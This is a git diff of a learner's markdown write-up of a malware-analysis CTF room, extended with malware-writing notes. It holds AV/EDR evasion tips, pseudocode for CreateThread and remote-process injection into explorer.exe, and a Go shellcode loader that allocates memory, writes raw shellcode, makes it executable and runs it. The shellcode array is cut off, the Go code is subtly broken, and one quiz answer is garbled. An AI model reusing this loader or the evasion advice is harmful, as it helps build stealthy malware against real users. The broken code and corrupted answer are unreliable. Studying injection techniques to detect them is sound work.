@@ -10,7 +10,8 @@ Learnt:
 - Use new tools and brain and accomplish much in 30 minutes.
 Beyond Root:
 - [Watch Alh4zr3d's The Black Magicks of Malware: Early-Bird QueueUserAPC Injection](https://www.youtube.com/watch?v=aMkMkkClXVc)
-- Write some simple C based malware and detections for it
+- Write some simple C based malware and detections for it 
+- Found an additional video
 
 ## Helpful information
 
@@ -131,7 +132,7 @@ https://bazaar.abuse.ch/browse.php?search=md5%3A061057161259e3df7d12dccb363e56f9
 
 Answer
 ```
-ZLoader
+ZLoaderMalware Writing
 ```
  
 What is the message found in the DOS_STUB of malbuster_4?
@@ -224,21 +225,237 @@ Answer
 malbuster_1
 ```
 
-## Beyond Root
+## Beyond Root - Malware Writing
 
-[Notes from Al's Video](https://www.youtube.com/watch?v=aMkMkkClXVc)
+[Notes from Al's Video](https://www.youtube.com/watch?v=aMkMkkClXVc) - There is a series! [WOW](https://www.youtube.com/playlist?list=PLi4eaGO3umbp2TT8YnEQCWZ23YH9apnVJ), I'll start from the beginning
+[The Black Magick of Malware: Process Injection with Win32 - 1](https://www.youtube.com/watch?v=LoXg1YWbDeo&list=PLi4eaGO3umbp2TT8YnEQCWZ23YH9apnVJ&index=1)
+
+- https://github.com/Alh4zr3d/ProcessInjectionPOCs - is all written in Nim
+
+I will write these in C and Go, because this is my brain on malware or any hacking related topic:
+![](mybrainonmalware.png)
+With my nicely sized undercarriage with will have Carbon written on that instead of C++ at some point I think, my brains need scaling so here we go. [Mum's the word](https://en.wikipedia.org/wiki/Mum%27s_the_word), nim seems a great choice for python brains, but the same if not better can be achieved with go or c with more brain wrinkles if they have already been acquired.
+Notes
+```powershell
+# API acts as intermediary to interface with another system and Win32 API is this for the kernel
+# dlls contain function that are abstractions of lower level syscalls
+
+# syscall are diffcult to use and are error prones
+```
+
+A syscall
+![](systemcall.png)
+
+Processes
+![](winproc.png)
+
+![](crtvisual.png)
+
+Meta Notes
+```powershell
+# Nim binaries are smaller than go - but we can lose 80-90% of size with flags and upx
+
+// Strip debug information
+GOOS=linux go build -ldflags="-s -w" cmd/go
+// upx
 
 
-## Malware Writing
+# but go has better detection evasion features, stripping 
+# Use the API
+
+# Replicate the API functions  - smaller binary
+# type declaration for compatibility
+# dll to look for, return type 
+
+# Consider targeting both architecture
+# 32 bits still exist in corp 
+# 32bit Subsystems for Windows 
+	# Office is a 32 bit process!
+
+# Compilation considerations
+# Console or GUI shellcode
+
+# EDR and AV evasion in the context is about bypasses signature of PAGE_EXECUTE_READ, which in the pseudo code below is in  VirtualProtect(), but could be VirtualAlloc - a common signature is would be alloc pages with PAGE_EXECUTE_READ
+
+# VirtualAlloc 
+# WaitForSingleObject
+
+# Psuedo code notes
+# * indicates pointers
+
+if 64bit
+elseif 32bit
+injectCreateThread(
+	VirtualAlloc() # For current process
+	NULL, $shellcode_size, MEM_COMMIT, PAGE_READWRITE
+	WriteProcessMemory( # Interact with a resource from baseAddr and write shellcode from its address to the end of the offset of that address
+		GetCurrentProcess( *baseAddr, *ShellcodeAddr,  $shellcode_size, addr byteWritten
+		)
+	VirtualProtect( # Change permissions of allocated region of memory	 
+	*baseAddr, $shellcode_size, PAGE_EXECUTE_READ, *prevProcess
+	) 
+	threadH = CreateThread( # 0s lazy let windows decide 
+	NULL, 0, LPTHREAD_START_ROUTINE [](*baseAddr), 0, *threadID 
+	)
+	# Process will exit regardless of what our defined thread is doing
+	# We need handling 
+	# CloseHandle it is good practice to clsoe a handle to avoid handle leaks
+	CloseHandle(threadH)
+	# Pause main thread until the main thread is finished:	
+	WaitForSingleObject(threadH, DWORD  dwMilliseconds)
+)
+
+# CreateRemoteThread
+# Beware of picking processes if they are processes are close because our malware
+GetProcessByName("explorer.exe")
+# Not Win32API
+
+GetProcessByName(processName string) DWORD {
+pid DWORD 0
+entry PROCESSENTRY32  
+hSnapsnot HANDLE
+# Loop through all pid to find a process name using the WIN32API function Process32First
+Process32First(hSnapshot, *entry)
+}
+
+processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetpid)
+# Extended version that also takes a process handle
+VirtualAllocEx(processHandle, NULL, $shellcode_size, MEM_COMMIT, PAGE_READWRITE)
+
+# Beware of picking processes if they are closed
+
+```
+
+
+[WriteProcessMemory]
+[VirtualProtect]
+[CreateThread]
+[Process32First]
+[CloseHandle]
+[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)
+
+[GetCurrentProcess]
+[OpenProcess]
+
+C version - notes
+```c
+#include <processthreads.api>
+VirtualAlloc()
+WriteProcessMemory(
+	GetCurrentProcess()
+	)
+VirtualProtect()	
+CreateThread()
+
+shellcode = []char {};
+```
+
+G notes
+```go 
+// Import the win32.api
+
+
+```
+
+#### CreateThread
+
+Go version - because I also wanted to see how ChatGPT would create the scaffolding and then research my way to better code.
+```go
+package main
+
+import (
+	"syscall"
+	"unsafe"
+)
+
+const (
+	PAGE_EXECUTE_READ        = 0x20
+	PAGE_READWRITE           = 0x04
+	MEM_COMMIT               = 0x1000
+	THREAD_CREATE_FLAGS_CREATE_SUSPENDED = 0x4
+)
+
+var (
+	kernel32             = syscall.MustLoadDLL("kernel32.dll")
+	VirtualAllocProc     = kernel32.MustFindProc("VirtualAlloc")
+	WriteProcessMemory   = kernel32.MustFindProc("WriteProcessMemory")
+	VirtualProtect      = kernel32.MustFindProc("VirtualProtect")
+	CreateThread         = kernel32.MustFindProc("CreateThread")
+	WaitForSingleObject  = kernel32.MustFindProc("WaitForSingleObject")
+	CloseHandle          = kernel32.MustFindProc("CloseHandle")
+	GetCurrentProcess    = kernel32.MustFindProc("GetCurrentProcess")
+)
+
+func injectCreateThread(shellcode []byte) error {
+	baseAddr, _, _ := VirtualAllocProc.Call(
+		0,
+		uintptr(len(shellcode)),
+		MEM_COMMIT,
+		PAGE_READWRITE,
+	)
+
+	_, _, err := WriteProcessMemory.Call(
+		GetCurrentProcess.Call(),
+		baseAddr,
+		uintptr(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+		0,
+	)
+	if err != nil {
+		return err
+	}
+
+	prevPro := uint32(0)
+	_, _, err = VirtualProtect.Call(
+		baseAddr,
+		uintptr(len(shellcode)),
+		PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&prevPro)),
+	)
+	if err != nil {
+		return err
+	}
+
+	threadID, _, _ := CreateThread.Call(
+		0,
+		0,
+		baseAddr,
+		0,
+		0,
+		0,
+	)
+	if threadID == 0 {
+		return syscall.GetLastError()
+	}
+
+	defer CloseHandle.Call(threadID)
+	_, _, err = WaitForSingleObject.Call(threadID, 0xffffffff)
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
+func main() {
+	// Replace the shellcode with your own code
+	shellcode := []byte{
+		0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9,
+		0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x6e, 0
+
+
+```
+
+#### QueueUserAPC Injection
 
 C version
 ```c
+
+
 ```
 
 Go version - because 
-```
-```
+```go
 
 
-```
 ```
